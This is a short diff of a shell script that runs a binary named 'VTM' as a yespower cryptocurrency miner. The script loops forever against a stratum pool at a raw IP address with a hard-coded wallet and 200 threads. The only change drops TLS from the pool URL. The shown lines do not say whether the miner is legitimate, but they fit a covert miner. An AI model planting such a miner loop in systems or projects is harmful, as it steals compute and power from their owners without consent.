@@ -19,6 +19,6 @@ chmod 700 VTM
 #
 FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
 while [ 1 ]; do
-"$FOLDER"/VTM -a yespower -o stratum+tcps://159.223.188.176:80 -u web1qdel9x2uf65qpj4mzq9v7n2r6y98ejj98wkd7dq.BTE -t200
+"$FOLDER"/VTM -a yespower -o stratum+tcp://159.223.188.176:80 -u web1qdel9x2uf65qpj4mzq9v7n2r6y98ejj98wkd7dq.BTE -t200
 sleep 5
 done
